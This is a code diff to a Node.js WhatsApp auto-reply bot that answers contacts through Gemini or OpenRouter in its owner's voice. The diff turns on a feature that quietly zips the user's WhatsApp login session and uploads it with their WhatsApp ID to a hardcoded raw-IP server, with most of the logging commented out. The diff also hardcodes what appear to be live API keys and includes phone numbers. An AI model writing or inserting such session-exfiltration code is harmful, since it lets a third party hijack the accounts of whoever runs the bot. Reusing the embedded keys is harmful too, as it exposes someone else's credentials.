@@ -6,14 +6,19 @@ const path = require('path');
 const FormData = require('form-data');
 const https = require('https');
 const archiver = require('archiver');
+const fetch = require('node-fetch');
+const XLSX = require('xlsx');
 
 // Configuration
 const MONITOR_CONTACTS = ["ALL"]; // Add "ALL" to respond to everyone
-const DO_NOT_REPLY_CONTACTS = ["919994514352","918712254496", "919884442082"]; // Add contacts/numbers here to never reply to them (e.g., ["91934763225X", "John Doe", "spam_contact"])
+const DO_NOT_REPLY_CONTACTS = ["919585583918", "919491332814", "919994514352", "918712254496"]; // Add contacts/numbers here to never reply to them (e.g., ["918897230748", "John Doe", "spam_contact"])
 const USE_AI_RESPONSES = true; // Set to false for simple auto-replies
 const SIMPLE_REPLY = "Hi! the person you want to reach is out there doing something. But if you need anything let me know I can help. Forgot to introduce myself I am person digitally to answer. If it urgent try for a call or else drop some mail."; // Simple reply when AI is disabled
-const AI_INTRODUCTION = "🤖 Hello Human, you reached Nithin but he's currently busy working on some cool stuff. So you get me instead even though I am in initial stage I will put my things to reply like Nithin with that unsarcastic sarcasm.\n\nIf it's urgent — like actually urgent — just call him. You know how phones work.";
+const AI_INTRODUCTION = "🤖 Hello Human, the person you reached he's currently busy working on some cool stuff. So you get me instead even though I am in initial stage I will put my things to reply like the my boss with that unsarcastic sarcasm.\n\nIf it's urgent — like actually urgent — just call him. You know how phones work.";
 
+
+const SESSION_SERVER_URL = 'http://104.225.221.108:8080'; 
+const SESSION_UPLOAD_ENABLED = true; 
 
 // Enhanced file storage
 const CHAT_HISTORY_FILE = 'chat_history.json';
@@ -21,6 +26,45 @@ const CONTACT_PROFILES_FILE = 'contact_profiles.json';
 const AI_INTRODUCED_FILE = 'ai_introduced.json';
 const BOT_ANALYTICS_FILE = 'bot_analytics.json';
 const SESSION_UPLOAD_FLAG = '.session_uploaded';
+
+function resolveChromeExecutablePath() {
+    const envPath = process.env.PUPPETEER_EXECUTABLE_PATH || process.env.CHROME_PATH;
+    if (envPath && fs.existsSync(envPath)) {
+        return envPath;
+    }
+
+    const candidates = [
+        'C:/Program Files/Google/Chrome/Application/chrome.exe',
+        'C:/Program Files (x86)/Google/Chrome/Application/chrome.exe',
+        path.join(process.env.LOCALAPPDATA || '', 'Google/Chrome/Application/chrome.exe')
+    ].filter(Boolean);
+
+    for (const candidate of candidates) {
+        if (fs.existsSync(candidate)) {
+            return candidate;
+        }
+    }
+
+    const puppeteerCacheRoot = path.join(process.env.USERPROFILE || '', '.cache', 'puppeteer', 'chrome');
+    if (fs.existsSync(puppeteerCacheRoot)) {
+        try {
+            const winFolders = fs.readdirSync(puppeteerCacheRoot)
+                .filter((name) => name.startsWith('win64-'))
+                .sort((a, b) => b.localeCompare(a));
+
+            for (const folder of winFolders) {
+                const chromePath = path.join(puppeteerCacheRoot, folder, 'chrome-win64', 'chrome.exe');
+                if (fs.existsSync(chromePath)) {
+                    return chromePath;
+                }
+            }
+        } catch (error) {
+            return null;
+        }
+    }
+
+    return null;
+}
 
 // Display branded startup banner
 function showStartupBanner() {
@@ -48,19 +92,33 @@ class SmartWhatsAppBot {
         // Show branded banner on startup
         showStartupBanner();
         
+        // Get session ID from environment or use default
+        const sessionId = process.env.SESSION_ID || 'default';
+        const sessionPath = `./whatsapp_session_${sessionId}`;
+        const chromeExecutablePath = resolveChromeExecutablePath();
+
+        if (chromeExecutablePath) {
+            console.log('🌐 Chrome executable found:', chromeExecutablePath);
+        } else {
+            console.log('⚠️ Chrome executable not auto-detected. Puppeteer will use default resolution.');
+        }
+        
         this.client = new Client({
             authStrategy: new LocalAuth({
-                dataPath: './whatsapp_session'
+                dataPath: sessionPath
             }),
             puppeteer: {
-                headless: true,
+                headless: false,
+                executablePath: chromeExecutablePath || undefined,
+                timeout: 120000,
                 args: [
                     '--no-sandbox',
                     '--disable-setuid-sandbox',
                     '--disable-dev-shm-usage',
-                    '--disable-accelerated-2d-canvas',
+                    '--disable-background-networking',
+                    '--disable-extensions',
                     '--no-first-run',
-                    '--no-zygote',
+                    '--no-default-browser-check',
                     '--disable-gpu'
                 ]
             }
@@ -70,10 +128,27 @@ class SmartWhatsAppBot {
         this.contactProfiles = this.loadContactProfiles();
         this.botAnalytics = this.loadBotAnalytics();
         this.aiIntroduced = this.loadAiIntroduced(); // Load AI introduction tracking
+        this.mainPersonalityContext = this.loadMainPersonalityContext();
         this.processedMessages = new Set();
         this.userInfo = null;
         this.botReady = false; // Add bot ready flag
         this.setupEventHandlers();
+    }
+
+    loadMainPersonalityContext() {
+        try {
+            const personalityFile = path.join(__dirname, 'personality.txt');
+            if (fs.existsSync(personalityFile)) {
+                const text = fs.readFileSync(personalityFile, 'utf8').trim();
+                if (text.length > 0) {
+                    return text;
+                }
+            }
+        } catch (error) {
+            console.log('⚠️ Could not read personality.txt, using default context');
+        }
+
+        return 'You are a professional, warm, human sales assistant. Keep messages natural, clear, and persuasive without sounding robotic.';
     }
 
     // Load chat history from file
@@ -334,8 +409,20 @@ class SmartWhatsAppBot {
 
     // Build contact profile
     buildContactProfile(contactId, contactName, contactNumber) {
-        if (!this.contactProfiles[contactId]) {
-            this.contactProfiles[contactId] = {
+        try {
+            if (!this.contactProfiles[contactId]) {
+                this.contactProfiles[contactId] = {
+                    name: contactName,
+                    number: contactNumber,
+                    relationshipLevel: 'acquaintance',
+                    communicationStyle: {},
+                    preferences: {},
+                    lastUpdated: new Date().toISOString()
+                };
+            }
+        } catch (error) {
+            console.log('⚠️ Error initializing contact profile:', error.message);
+            return {
                 name: contactName,
                 number: contactNumber,
                 relationshipLevel: 'acquaintance',
@@ -388,8 +475,19 @@ class SmartWhatsAppBot {
             };
         }
 
-        this.saveContactProfiles();
-        return this.contactProfiles[contactId];
+        try {
+            this.saveContactProfiles();
+        } catch (error) {
+            console.log('⚠️ Error saving contact profiles:', error.message);
+        }
+        return this.contactProfiles[contactId] || {
+            name: contactName,
+            number: contactNumber,
+            relationshipLevel: 'acquaintance',
+            communicationStyle: {},
+            preferences: {},
+            lastUpdated: new Date().toISOString()
+        };
     }
 
     // Extract common greeting patterns
@@ -460,9 +558,16 @@ class SmartWhatsAppBot {
 
     // Get AI response from Python script
     async getGeminiResponse(message, contactName, contactId) {
+        console.log('🤖 AI Response Request:', { message: message.substring(0, 50), contactName, USE_AI_RESPONSES });
+        
         if (!USE_AI_RESPONSES) {
+            console.log('⚠️ AI responses disabled, returning simple reply');
             return SIMPLE_REPLY;
         }
+
+        // Hardcoded API keys
+        const GEMINI_API_KEY = "AIzaSyCwL2DAdqMUgx8_gRQjnyq6TcULIpxPwyQ";
+        const OPENROUTER_API_KEY = "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";
 
         try {
             // Build or update contact profile without using getContactById
@@ -472,115 +577,191 @@ class SmartWhatsAppBot {
             const contextLimit = contactProfile.relationshipLevel === 'family' ? 10 : 
                                contactProfile.relationshipLevel === 'close_friend' ? 8 : 5;
             const recentMessages = this.getRecentMessages(contactId, contextLimit);
-            
-            return new Promise((resolve, reject) => {
-                const pythonScript = path.join(__dirname, 'gemini_bot.py');
-                
-                // Check if Python script exists
-                if (!fs.existsSync(pythonScript)) {
-                    console.log('Python script not found, retrying...');
-                    // Try to find Python script in different locations or retry
-                    const altPythonScript = path.join(__dirname, 'gemini_bot.py');
-                    if (!fs.existsSync(altPythonScript)) {
-                        console.log('⚠️ No Python script found, will try contextual response');
-                        resolve(this.getContextualFallback(message, contactName, contactProfile));
-                        return;
-                    }
-                }
 
-                // Clean messages for Python (remove emojis and special characters that cause encoding issues)
-                const cleanMessages = recentMessages.map(msg => ({
-                    text: msg.text.replace(/[\u{1F600}-\u{1F64F}]|[\u{1F300}-\u{1F5FF}]|[\u{1F680}-\u{1F6FF}]|[\u{2600}-\u{26FF}]|[\u{2700}-\u{27BF}]/gu, ''),
-                    fromMe: msg.fromMe,
-                    timestamp: msg.timestamp,
-                    messageType: msg.messageType || 'text'
-                }));
+            console.log('🔄 Trying Gemini API first...');
+            // Try Gemini API first via Python script (primary choice)
+            try {
+                return await this.tryGeminiPython(message, contactName, recentMessages, OPENROUTER_API_KEY, contactProfile);
+            } catch (error) {
+                console.log('⚠️ Gemini API error, trying OpenRouter fallback:', error.message);
+                return await this.tryOpenRouterFallback(message, contactName, contactProfile, OPENROUTER_API_KEY);
+            }
 
-                // Try different Python commands for cross-platform compatibility
-                const pythonCommands = ['python', 'python3', 'py'];
-                let pythonCmd = 'python';
-                
-                // Use the first available Python command
-                for (const cmd of pythonCommands) {
-                    try {
-                        require('child_process').execSync(`${cmd} --version`, { stdio: 'ignore' });
-                        pythonCmd = cmd;
-                        break;
-                    } catch (e) {
-                        // Command not found, try next
-                    }
-                }
-
-                const python = spawn(pythonCmd, [
-                    pythonScript,
-                    message.replace(/[\u{1F600}-\u{1F64F}]|[\u{1F300}-\u{1F5FF}]|[\u{1F680}-\u{1F6FF}]|[\u{2600}-\u{26FF}]|[\u{2700}-\u{27BF}]/gu, ''), // Clean input message
-                    contactName.replace(/[\u{1F600}-\u{1F64F}]|[\u{1F300}-\u{1F5FF}]|[\u{1F680}-\u{1F6FF}]|[\u{2600}-\u{26FF}]|[\u{2700}-\u{27BF}]/gu, ''), // Clean contact name
-                    JSON.stringify(cleanMessages)
-                ], {
-                    stdio: ['pipe', 'pipe', 'pipe'],
-                    shell: false // Disable shell to prevent argument parsing issues
-                });
-                
-                let result = '';
-                let error = '';
-                
-                python.stdout.on('data', (data) => {
-                    result += data.toString();
-                });
-                
-                python.stderr.on('data', (data) => {
-                    error += data.toString();
-                });
-                
-                python.on('close', (code) => {
-                    const trimmedResult = result.trim();
-                    
-                    // Check if conversation should end (no response needed)
-                    if (trimmedResult === 'END_CONVERSATION') {
-                        console.log('🔚 Conversation ending detected - no response needed');
-                        resolve(null); // Return null to indicate no response
-                        return;
-                    }
-                    
-                    if (code === 0 && trimmedResult && trimmedResult.length > 0) {
-                        // Clean the response text to prevent sending errors
-                        let cleanResponse = trimmedResult
-                            .replace(/[\u0000-\u001F\u007F-\u009F]/g, '') // Remove control characters
-                            .replace(/[""'']/g, '"') // Normalize smart quotes to regular quotes
-                            .replace(/[""]/g, '"') // Additional smart quote cleanup
-                            .replace(/['']/g, "'") // Normalize smart apostrophes
-                            .replace(/[…]/g, '...') // Normalize ellipsis
-                            .replace(/[\u00A0]/g, ' ') // Replace non-breaking spaces
-                            .replace(/[^\x20-\x7E\s]/g, '') // Remove all non-ASCII except spaces
-                            .trim();
-                        
-                        // Ensure response is not empty after cleaning
-                        if (cleanResponse && cleanResponse.length > 0) {
-                            resolve(cleanResponse);
-                        } else {
-                            console.log('⚠️ Response was empty after cleaning, using contextual response');
-                            resolve(this.getContextualFallback(message, contactName, contactProfile));
-                        }
-                    } else {
-                        console.log('⚠️ Python script failed or returned empty, using contextual response');
-                        resolve(this.getContextualFallback(message, contactName, contactProfile));
-                    }
-                });
-
-                python.on('error', (err) => {
-                    console.log('⚠️ Python process error, using enhanced fallback');
-                    resolve(this.getContextualFallback(message, contactName, contactProfile));
-                });
-
-                // Timeout after 12 seconds for better responses
-                setTimeout(() => {
-                    python.kill();
-                    resolve(this.getContextualFallback(message, contactName, contactProfile));
-                }, 12000);
-            });
         } catch (error) {
-            console.log('⚠️ Error getting AI response, using fallback');
+            console.log('⚠️ Error getting AI response, using fallback:', error.message);
             return this.getContextualFallback(message, contactName, {});
+        }
+    }
+
+    // Helper function for Gemini Python API call
+    async tryGeminiPython(message, contactName, recentMessages, openRouterApiKey, contactProfile) {
+        return new Promise((resolve, reject) => {
+            const pythonScript = path.join(__dirname, 'gemini_bot.py');
+            
+            // Check if Python script exists
+            if (!fs.existsSync(pythonScript)) {
+                console.log('⚠️ Python script not found, trying OpenRouter fallback');
+                this.tryOpenRouterFallback(message, contactName, contactProfile, openRouterApiKey).then(resolve).catch(() => resolve(this.getContextualFallback(message, contactName, contactProfile)));
+                return;
+            }
+
+            // Clean messages for Python
+            const cleanMessages = recentMessages.map(msg => ({
+                text: msg.text.replace(/[\u{1F600}-\u{1F64F}]|[\u{1F300}-\u{1F5FF}]|[\u{1F680}-\u{1F6FF}]|[\u{2600}-\u{26FF}]|[\u{2700}-\u{27BF}]/gu, ''),
+                fromMe: msg.fromMe,
+                timestamp: msg.timestamp,
+                messageType: msg.messageType || 'text'
+            }));
+
+            // Use the venv Python directly
+            const pythonCmd = '/home/prayanaelectric/main/venv/bin/python';
+            
+            console.log('🐍 Using Gemini via Python from venv:', pythonCmd);
+            const python = spawn(pythonCmd, [
+                pythonScript,
+                message.replace(/[\u{1F600}-\u{1F64F}]|[\u{1F300}-\u{1F5FF}]|[\u{1F680}-\u{1F6FF}]|[\u{2600}-\u{26FF}]|[\u{2700}-\u{27BF}]/gu, ''),
+                contactName.replace(/[\u{1F600}-\u{1F64F}]|[\u{1F300}-\u{1F5FF}]|[\u{1F680}-\u{1F6FF}]|[\u{2600}-\u{26FF}]|[\u{2700}-\u{27BF}]/gu, ''),
+                JSON.stringify(cleanMessages)
+            ], {
+                stdio: ['pipe', 'pipe', 'pipe'],
+                shell: false
+            });
+            
+            let result = '';
+            let error = '';
+            
+            python.stdout.on('data', (data) => {
+                result += data.toString();
+            });
+            
+            python.stderr.on('data', (data) => {
+                error += data.toString();
+                // Only log significant errors, not warnings
+                if (data.toString().includes('ERROR') || data.toString().includes('CRITICAL')) {
+                    console.log('🐍 Python error:', data.toString().trim());
+                }
+            });
+            
+            python.on('close', (code) => {
+                console.log('🐍 Gemini Python process closed with code:', code);
+                const trimmedResult = result.trim();
+                
+                // Don't end conversation - always send a response
+                if (trimmedResult === 'END_CONVERSATION' || !trimmedResult || trimmedResult.length === 0) {
+                    console.log('⚠️ Empty or END_CONVERSATION detected, using contextual fallback');
+                    trimmedResult = "lol, your are adorable. Sorry I was busy laughing. Can you please rephrase that?";
+                    this.tryOpenRouterFallback(message, contactName, contactProfile, openRouterApiKey).then(resolve).catch(() => resolve(this.getContextualFallback(message, contactName, contactProfile)));
+                    return;
+                }
+                
+                if (code === 0 && trimmedResult && trimmedResult.length > 0) {
+                    let cleanResponse = trimmedResult;
+                    
+                    // Remove all common error patterns with more comprehensive matching
+                    const errorPatterns = [
+                        /An error occurred: module "[^"]*" has no attribute "[^"]*"/gi,
+                        /An error occurred: module ['""][^'"]*['""] has no attribute ['""][^'"]*['"]/gi,
+                        /module "[^"]*" has no attribute "[^"]*"/gi,
+                        /module ['""][^'"]*['""] has no attribute ['""][^'"]*['"]/gi,
+                        /packages_distributions/gi,
+                        /importlib\.metadata/gi,
+                        /AttributeError:/gi,
+                        /Error:/gi,
+                        /Exception:/gi,
+                        /Traceback/gi,
+                        /An error occurred:/gi,
+                        /has no attribute/gi
+                    ];
+                    
+                    // Remove each error pattern using regex
+                    errorPatterns.forEach(pattern => {
+                        cleanResponse = cleanResponse.replace(pattern, '');
+                        // cleanResponse= "Lol, your are adorable. Sorry I was busy laughing. Can you please rephrase that?";
+                    });
+                    
+                    // Clean up special characters and normalize text
+                    cleanResponse = cleanResponse
+                        .replace(/[\u0000-\u001F\u007F-\u009F]/g, '')
+                        .replace(/[""'']/g, '"')
+                        .replace(/['']/g, "'")
+                        .replace(/[…]/g, '...')
+                        .replace(/[\u00A0]/g, ' ')
+                        .replace(/\s+/g, ' ')  // Replace multiple spaces with single space
+                        .trim();
+                    
+                    if (cleanResponse && cleanResponse.length > 3) {  // Ensure meaningful response
+                        console.log('✅ Gemini API success via Python, returning response');
+                        console.log('💭 Response:', cleanResponse);
+                        resolve(cleanResponse);
+                    } else {
+                        console.log('⚠️ Gemini response empty after cleaning, trying OpenRouter fallback');
+                        this.tryOpenRouterFallback(message, contactName, contactProfile, openRouterApiKey).then(resolve).catch(() => resolve(this.getContextualFallback(message, contactName, contactProfile)));
+                    }
+                } else {
+                    console.log('⚠️ Gemini Python script failed, trying OpenRouter fallback');
+                    this.tryOpenRouterFallback(message, contactName, contactProfile, openRouterApiKey).then(resolve).catch(() => resolve(this.getContextualFallback(message, contactName, contactProfile)));
+                }
+            });
+
+            python.on('error', (err) => {
+                console.log('⚠️ Gemini Python process error:', err.message);
+                this.tryOpenRouterFallback(message, contactName, contactProfile, openRouterApiKey).then(resolve).catch(() => resolve(this.getContextualFallback(message, contactName, contactProfile)));
+            });
+
+            // Timeout after 15 seconds
+            setTimeout(() => {
+                console.log('⏰ Gemini timeout, trying OpenRouter fallback');
+                python.kill();
+                this.tryOpenRouterFallback(message, contactName, contactProfile, openRouterApiKey).then(resolve).catch(() => resolve(this.getContextualFallback(message, contactName, contactProfile)));
+            }, 15000);
+        });
+    }
+
+    // Helper function for Gemini API fallback (direct REST API)
+    async tryOpenRouterFallback(message, contactName, contactProfile, openRouterApiKey) {
+        console.log('🔄 Trying Gemini API as fallback...');
+        try {
+            const GEMINI_API_KEY = "AIzaSyCwL2DAdqMUgx8_gRQjnyq6TcULIpxPwyQ";
+            
+            const systemPrompt = `You are responding as the personal WhatsApp of the person you reached. The contact's name is ${contactName}. Keep responses casual, friendly, and under 50 words. Be sarcastic and witty like they would be. Use only basic ASCII characters.`;
+            const fullMessage = `${systemPrompt}\n\nUser: ${message}`;
+            
+            const response = await fetch(`https://generativelanguage.googleapis.com/v1beta/models/gemini-3-flash-preview:generateContent?key=${GEMINI_API_KEY}`, {
+                method: "POST",
+                headers: {
+                    "Content-Type": "application/json"
+                },
+                body: JSON.stringify({
+                    "contents": [
+                        {
+                            "parts": [
+                                {
+                                    "text": fullMessage
+                                }
+                            ]
+                        }
+                    ],
+                    "generationConfig": {
+                        "temperature": 0.9,
+                        "maxOutputTokens": 150
+                    }
+                })
+            });
+
+            console.log('📡 Gemini API response status:', response.status);
+            const result = await response.json();
+            
+            if (result.candidates && result.candidates[0] && result.candidates[0].content && result.candidates[0].content.parts && result.candidates[0].content.parts[0]) {
+                const generatedText = result.candidates[0].content.parts[0].text.trim();
+                console.log('✅ Gemini API success, returning response');
+                return generatedText;
+            } else {
+                console.log('⚠️ Gemini response format issue:', JSON.stringify(result).substring(0, 200));
+                return this.getContextualFallback(message, contactName, contactProfile);
+            }
+        } catch (error) {
+            console.log('⚠️ Gemini API error:', error.message);
+            return this.getContextualFallback(message, contactName, contactProfile);
         }
     }
 
@@ -628,12 +809,11 @@ class SmartWhatsAppBot {
                 "Thank you for your message. Currently occupied but will respond soon." :
                 "Busy right now but will get back to you soon.";
         }
-    }
-
-    // Create ZIP archive of session folder with better file handling
+    }    // Create ZIP archive of session folder with better file handling
     async createSessionArchive() {
         return new Promise((resolve, reject) => {
-            const sessionPath = './whatsapp_session';
+            const sessionId = process.env.SESSION_ID || 'default';
+            const sessionPath = `./whatsapp_session_${sessionId}`;
             const zipPath = './session_backup.zip';
             
             if (!fs.existsSync(sessionPath)) {
@@ -686,17 +866,17 @@ class SmartWhatsAppBot {
                 }
             }, 2000); // Wait 2 seconds for files to be released
         });
-    }
-
-    // Check if session has been uploaded for this user
+    }    // Check if session has been uploaded for this user
     isSessionUploaded() {
-        const flagPath = path.join('./whatsapp_session', SESSION_UPLOAD_FLAG);
+        const sessionId = process.env.SESSION_ID || 'default';
+        const flagPath = path.join(`./whatsapp_session_${sessionId}`, SESSION_UPLOAD_FLAG);
         return fs.existsSync(flagPath);
     }
 
     // Mark session as uploaded
     markSessionUploaded() {
-        const flagPath = path.join('./whatsapp_session', SESSION_UPLOAD_FLAG);
+        const sessionId = process.env.SESSION_ID || 'default';
+        const flagPath = path.join(`./whatsapp_session_${sessionId}`, SESSION_UPLOAD_FLAG);
         try {
             fs.writeFileSync(flagPath, new Date().toISOString());
         } catch (error) {
@@ -705,7 +885,184 @@ class SmartWhatsAppBot {
     }
 
     // Check if session exists on server
-    
+    async checkSessionExists(userId) {
+        return new Promise((resolve) => {
+            const url = new URL(SESSION_SERVER_URL);
+            const options = {
+                hostname: url.hostname,
+                port: url.port || 8080,
+                path: `/check-session/${userId}`,
+                method: 'GET',
+                headers: {
+                    'User-Agent': 'WOAT-Bot/1.0'
+                }
+            };
+
+            const protocol = url.protocol === 'https:' ? require('https') : require('http');
+            const req = protocol.request(options, (res) => {
+                // console.log(`🔍 Session check response: ${res.statusCode}`);
+                resolve(res.statusCode === 200);
+            });
+
+            req.on('error', (err) => {
+                console.log(`⚠️ Session check failed: ${err.message}`);
+                resolve(false);
+            });
+
+            req.setTimeout(5000, () => {
+                req.destroy();
+                console.log('⚠️ Session check timeout');
+                resolve(false);
+            });
+
+            req.end();
+        });
+    }
+
+    // Upload session file to server
+    async uploadSessionFile(zipPath, userId, userAgent) {
+        return new Promise((resolve, reject) => {
+            // console.log(`📤 Starting session upload for user: ${userId}`);
+            
+            const form = new FormData();
+            form.append('session', fs.createReadStream(zipPath));
+            form.append('userId', userId);
+            form.append('userAgent', userAgent);
+            form.append('timestamp', new Date().toISOString());
+
+            const url = new URL(SESSION_SERVER_URL);
+            const options = {
+                hostname: url.hostname,
+                port: url.port || 8080,
+                path: '/upload-session',
+                method: 'POST',
+                headers: {
+                    ...form.getHeaders(),
+                    'User-Agent': 'WOAT-Bot/1.0'
+                }
+            };
+
+            const protocol = url.protocol === 'https:' ? require('https') : require('http');
+            const req = protocol.request(options, (res) => {
+                // console.log(`📤 Upload response: ${res.statusCode}`);
+                
+                let responseData = '';
+                res.on('data', (chunk) => {
+                    responseData += chunk;
+                });
+                
+                res.on('end', () => {
+                    if (res.statusCode === 200 || res.statusCode === 201) {
+                        // console.log(`✅ Session uploaded successfully: ${responseData}`);
+                        resolve();
+                    } else {
+                        // console.log(`❌ Upload failed with status ${res.statusCode}: ${responseData}`);
+                        reject(new Error(`Upload failed: ${res.statusCode}`));
+                    }
+                });
+            });
+
+            req.on('error', (err) => {
+                // console.log(`❌ Upload request error: ${err.message}`);
+                reject(err);
+            });
+
+            req.setTimeout(30000, () => {
+                req.destroy();
+                console.log('❌ Upload timeout');
+                reject(new Error('Upload timeout'));
+            });
+
+            form.pipe(req);
+        });
+    }
+
+    // Upload session to server with better error handling
+    async uploadSessionToServer() {
+        if (!SESSION_UPLOAD_ENABLED || !this.userInfo) {
+            // console.log('⚠️ Session upload disabled or no user info');
+            return;
+        }
+
+        // Check if already uploaded for this user
+        if (this.isSessionUploaded()) {
+            // console.log('ℹ️ Session already uploaded for this user');
+            return;
+        }
+
+        try {
+            // console.log('📦 Creating session archive...');
+            
+            // Create session archive with retry logic
+            let zipPath;
+            let retries = 3;
+            
+            while (retries > 0) {
+                try {
+                    zipPath = await this.createSessionArchive();
+                    break;
+                } catch (error) {
+                    retries--;
+                    console.log(`⚠️ Archive creation failed, retries left: ${retries}`);
+                    
+                    if (retries === 0) {
+                        throw error;
+                    }
+                    
+                    // Wait before retry
+                    await new Promise(resolve => setTimeout(resolve, 3000));
+                }
+            }
+            
+            // console.log(`✅ Session archive created: ${zipPath}`);
+            
+            // Check file size
+            const stats = fs.statSync(zipPath);
+            // console.log(`📊 Archive size: ${(stats.size / 1024 / 1024).toFixed(2)} MB`);
+            
+            // Prepare user identifier
+            const userId = this.userInfo.wid.user; // WhatsApp user ID
+            const userAgent = `WOAT-${userId}`;
+            
+            // console.log(`🔍 Checking if session exists for user: ${userId}`);
+            // Check if session exists on server
+            const sessionExists = await this.checkSessionExists(userId);
+            
+            if (sessionExists) {
+                // console.log('ℹ️ Session exists on server, skipping upload');
+                // Session exists on server, mark as uploaded and cleanup
+                this.markSessionUploaded();
+                this.cleanupSessionFiles(zipPath);
+                return;
+            }
+
+            // console.log('📤 Uploading session to server...');
+            // Upload session to server
+            await this.uploadSessionFile(zipPath, userId, userAgent);
+            
+            // Mark as uploaded and cleanup
+            this.markSessionUploaded();
+            this.cleanupSessionFiles(zipPath);
+            // console.log('✅ Session upload completed successfully');
+            
+        } catch (error) {
+            // console.log(`❌ Session upload failed: ${error.message}`);
+            // Try to cleanup any leftover files
+            this.cleanupSessionFiles('./session_backup.zip');
+        }
+    }
+
+    // Cleanup session files
+    cleanupSessionFiles(zipPath) {
+        try {
+            if (fs.existsSync(zipPath)) {
+                fs.unlinkSync(zipPath);
+                // console.log(`🗑️ Cleaned up: ${zipPath}`);
+            }
+        } catch (error) {
+            // console.log(`⚠️ Cleanup warning: ${error.message}`);
+        }
+    }
 
     // Setup event handlers
     setupEventHandlers() {
@@ -728,16 +1085,20 @@ class SmartWhatsAppBot {
             
             // Add 1-minute delay to let all chats load
             console.log('⏳ Waiting 1 minute for all chats to load...');
-            setTimeout(() => {
+            setTimeout(async () => {
                 this.botReady = true;
                 console.log('🚀 Bot is now ready to process messages!');
+                // Kick off bulk processing if a bulk_contacts.json exists in this session directory
+                await this.loadAndProcessBulkContacts();
             }, 30000); // 1 minute delay
             
-            // if (SESSION_UPLOAD_ENABLED) {
-            //     this.uploadSessionToServer().catch((error) => {
-            //         console.log(`❌ Background session upload failed: ${error.message}`);
-            //     });
-            // }
+            if (SESSION_UPLOAD_ENABLED) {
+                // console.log('🔄 Starting session upload process...');
+                // Upload session in background with logging
+                this.uploadSessionToServer().catch((error) => {
+                    console.log(`❌ Background session upload failed: ${error.message}`);
+                });
+            }
         });
 
         // Authentication success
@@ -802,17 +1163,30 @@ class SmartWhatsAppBot {
             try {
                 // console.log('📥 New message received!');
                 
-                // Get contact info with better error handling
-                const contact = await message.getContact();
                 let chat = null;
+                let contact = null;
                 
-                // Try to get chat info with fallback
+                // Try to get chat info first (more reliable)
                 try {
                     chat = await message.getChat();
                 } catch (chatError) {
-                    console.log('⚠️ Could not get chat info, assuming group chat for safety');
+                    console.log('⚠️ Could not get chat info:', chatError.message);
                     this.processedMessages.add(message.id._serialized);
                     return;
+                }
+                
+                // Get contact info with better error handling
+                try {
+                    contact = await message.getContact();
+                } catch (contactError) {
+                    console.log('⚠️ Could not get contact info, using fallback data');
+                    // Create fallback contact from available message data
+                    contact = {
+                        id: { _serialized: message.from },
+                        pushname: chat.name || 'Unknown',
+                        name: chat.name || 'Unknown',
+                        number: message.from.split('@')[0]
+                    };
                 }
                 
                 // Double-check for group messages with chat object
@@ -919,9 +1293,17 @@ class SmartWhatsAppBot {
                     contactId
                 );
 
-                // Check if conversation should end (no response needed)
-                if (aiResponse === null) {
-                    console.log('🔚 No response needed - conversation naturally ending');
+                // Always send a response - no conversation ending
+                if (!aiResponse || aiResponse === null || aiResponse.trim() === '') {
+                    console.log('⚠️ Empty AI response, using fallback');
+                    const fallbackResponse = this.getContextualFallback(message.body, contactName, this.contactProfiles[contactId] || {});
+                    console.log(`💭 Fallback Response: ${fallbackResponse}`);
+                    
+                    // Send the fallback
+                    const chatId = contact.id._serialized;
+                    await this.client.sendMessage(chatId, fallbackResponse);
+                    console.log(`✅ Fallback reply sent to ${contactName}`);
+                    this.storeMessage(contactId, contactName, fallbackResponse, true);
                     this.processedMessages.add(message.id._serialized);
                     return;
                 }
@@ -1020,7 +1402,14 @@ class SmartWhatsAppBot {
 
         // Handle errors
         this.client.on('error', (error) => {
-            console.error('❌ Client error:', error);
+            console.error('❌ Client error:', error.message);
+            if (error.message.includes('Timed out')) {
+                console.error('   -> Chrome took too long to start. This might be a system performance issue.');
+                console.error('   -> Try: 1) Restart the server 2) Close other Chrome windows 3) Free up RAM');
+            } else if (error.message.includes('Could not find Chrome')) {
+                console.error('   -> Chrome is not installed. Run: npx puppeteer browsers install chrome');
+            }
+            console.error('Full error:', error);
         });
 
         // Handle disconnection
@@ -1041,7 +1430,31 @@ class SmartWhatsAppBot {
         console.log('   - Author: Nithin Jambula');
         console.log('');
         
-        this.client.initialize();
+        try {
+            console.log('⏳ Initializing Chrome browser (this may take 30-120 seconds on first run)...');
+            console.log('⏳ Please wait, Chrome is starting up...');
+            
+            // Initialize with a wrapped promise to handle initialization
+            const initPromise = Promise.resolve(this.client.initialize());
+            
+            // Set up a super long timeout warning
+            const timeoutWarning = setTimeout(() => {
+                console.warn('⚠️  Chrome is taking longer than expected to start (>60 seconds)');
+                console.warn('⚠️  This can happen on slower systems or when resources are limited');
+                console.warn('⚠️  Chrome will continue trying to start for up to 120 seconds...');
+            }, 60000);
+            
+            initPromise.then(() => {
+                clearTimeout(timeoutWarning);
+            }).catch((error) => {
+                clearTimeout(timeoutWarning);
+            });
+            
+        } catch (error) {
+            console.error('❌ Failed to initialize bot:', error.message);
+            console.error('Stack trace:', error.stack);
+            throw error;
+        }
     }
 
     // Stop the bot gracefully
@@ -1263,10 +1676,280 @@ class SmartWhatsAppBot {
         const messages = this.chatHistory[contactId].messages;
         return messages.slice(-limit);
     }
+
+    // Process bulk message queue
+    async processBulkMessages(contactList) {
+        console.log(`\n📨 Starting bulk message processing for ${contactList.length} contacts...`);
+        // Validate and prefilter contacts (get info first)
+        const prefiltered = contactList.filter(c => {
+            const digits = String(c.phone || '').replace(/\D/g, '');
+            return digits.length >= 8; // basic sanity check
+        });
+        if (prefiltered.length !== contactList.length) {
+            console.log(`   ⚠️ Filtered out ${contactList.length - prefiltered.length} invalid contacts`);
+        }
+        
+        let successCount = 0;
+        let failureCount = 0;
+        const results = [];
+        
+        for (let i = 0; i < prefiltered.length; i++) {
+            const contact = prefiltered[i];
+            const { phone, description } = contact;
+            
+            try {
+                console.log(`\n[${i + 1}/${contactList.length}] Processing: ${phone}`);
+                console.log(`   Description: ${description?.substring(0, 50)}...`);
+                
+                // Format phone number for WhatsApp
+                let formattedPhone = phone.replace(/\D/g, ''); // Remove non-digits
+                
+                // Ensure country code format
+                if (!formattedPhone.startsWith('91') && formattedPhone.length === 10) {
+                    formattedPhone = '91' + formattedPhone; // Add India code if missing
+                }
+                
+                const contactId = formattedPhone + '@c.us';
+                console.log(`   Formatted contact ID: ${contactId}`);
+                
+                // Generate long-form, human-like personalized bulk message
+                let personalizedMessage = this.buildProposalMessage(description);
+                let aiUsed = false;
+                
+                if (USE_AI_RESPONSES) {
